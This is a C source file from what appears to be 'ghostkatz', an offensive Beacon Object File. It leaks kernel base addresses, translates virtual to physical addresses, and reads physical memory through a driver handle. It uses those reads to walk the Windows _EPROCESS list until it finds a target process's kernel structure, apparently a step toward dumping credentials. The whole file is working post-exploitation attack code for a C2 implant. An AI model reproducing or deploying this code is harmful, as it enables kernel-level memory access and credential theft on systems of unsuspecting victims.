#include <windows.h>
#include <wchar.h>

#include "ghostkatz.h"
#include "superfetch.h"
#include "defs.h"

static PVOID lpImageBase[2048]; // Move lpImageBase off the stack to avoid '___chkstk_ms' error
DWORD64 GetNtKernelVirtualAddresses(void)
{
    DWORD cb = 2048;
    DWORD lpcbNeeded;

    BOOL bResult = EnumDeviceDrivers(lpImageBase, cb, &lpcbNeeded);
    if (!bResult)
    {
        BeaconFormatPrintf(&outputbuffer, "Error when calling EnumDeviceDrivers: 0x%lx\n", GetLastError());
        return 0;
    }

    int numberOfDevices = lpcbNeeded / sizeof(LPVOID);
    //printf("Number of devices enumerated: %d\n", numberOfDevices);

    DWORD64 NtVirtualBaseAddress = (DWORD64)lpImageBase[0]; // ntoskrnl.exe
    //printf("[+] Ntoskrnl Virtual Address: 0x%llx\n", NtVirtualBaseAddress);
    return NtVirtualBaseAddress;
}


// Used for getting EPROCESS structs eventually
DWORD64 GetFunctionOffsetFromNtoskrnl(char* FunctionName)
{
    HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (Ntoskrnl == NULL)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to load ntoskrnl!\n");
        return 0;
    }
    DWORD64 GetFunctionOffset = (DWORD64)(GetProcAddress(Ntoskrnl, FunctionName)) - (DWORD64)Ntoskrnl;

    //printf("[+] %s offset from Ntoskrnl base: 0x%llx\n", FunctionName, GetFunctionOffset);

    FreeLibrary(Ntoskrnl);

    return GetFunctionOffset;
}


DWORD64 GetNtEprocessAddress(HANDLE hFile)
{
    DWORD64 NtVirtualBaseAddress = GetNtKernelVirtualAddresses();  // EnumDeviceDrivers to get ntoskrnl kernel VA
    DWORD64 PsInitialSystemProcessOffset = GetFunctionOffsetFromNtoskrnl("PsInitialSystemProcess");  // Get PsInitialSystemProcess offset
    DWORD64 PsInitialSystemProcessVA = NtVirtualBaseAddress + PsInitialSystemProcessOffset;   // Get PsInitialSystemProcess kernel VA

    // Get physical address of PsInitialSystemProcess
    DWORD64 TargetPhysicalAddress = 0;
    TranslateV2P(PsInitialSystemProcessVA, &TargetPhysicalAddress);
    DWORD64 PsInitialSystemProcessPA = TargetPhysicalAddress;


    // Read physical memory at PsInitialSystemProcess to get _EPROCESS virtual address
    DWORD64 NtEprocessVirtualAddress = ReadAddressAtPhysicalAddressLocation(hFile, PsInitialSystemProcessPA);

    //DEBUG_PRINT("NTOSKRNL _EPROCESS virtual address: 0x%llx\n", NtEprocessVirtualAddress);
    return NtEprocessVirtualAddress;
}

DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA)
{
    int offsetActiveProcessLinks = 0x448;

    // Starting from _EPROCESS address, traverse the ActiveProcessLinks member to get the _EPROCESS for other processes
    DWORD64 TargetPhysicalAddress = 0;
    TranslateV2P(NtEprocessVA,  &TargetPhysicalAddress);
    DWORD64 NtEProcessPA = TargetPhysicalAddress;


    // Get the Flink for Nt's ActiveProcessLinks member and start from there
    DWORD64 InitialActiveProcessLinksFlink = NtEProcessPA + offsetActiveProcessLinks;
    DWORD64 ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, InitialActiveProcessLinksFlink);   

    int FlinkPID = 0;
    DWORD64 TargetProcessEProcessBase = 0;

    while (FlinkPID != TargetPID)
    {
        TranslateV2P(ActiveProcessLinksFlink, &TargetPhysicalAddress); // Returned PA will be the ActiveProcessLinks member
        for (DWORD64 i = TargetPhysicalAddress - 1; i >= TargetPhysicalAddress - 8; i--) // Check the PID member
        {
            BYTE ReadValue = 0;
            ReadByte(hFile, i, &ReadValue);
            FlinkPID = (FlinkPID << 8);
            FlinkPID += ReadValue;
        }
        if (FlinkPID == 4) // We looped back around to SYSTEM (Nt) pid
        {
            BeaconFormatPrintf(&outputbuffer, "Could not find _EPROCESS address for target process!");
            break;
        }

        if (FlinkPID != TargetPID)
        {
            // Read address of ActiveProcessLinks member to traverse to the next entry in the linked list
            ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, TargetPhysicalAddress);
        }
        else
        {
            
            TargetProcessEProcessBase = TargetPhysicalAddress - offsetActiveProcessLinks;
            //DEBUG_PRINT("Found Target Process PID: %d\n", FlinkPID);

            // Target _EPROCESS address is represented as a PA. I want to translate to VA and then return that value
            DWORD64 TargetEprocessVirtualAddress = 0;
            if (TranslateP2V(TargetProcessEProcessBase, &TargetEprocessVirtualAddress))
            {
                //DEBUG_PRINT("Target _EPROCESS Virtual Address: 0x%llx\n", TargetEprocessVirtualAddress);
                return TargetEprocessVirtualAddress;
            }
            else
            {
                BeaconFormatPrintf(&outputbuffer, "Failed to get _EPROCESS address of target process!");
                return 0;
            }
        }
    }
    return 0;
}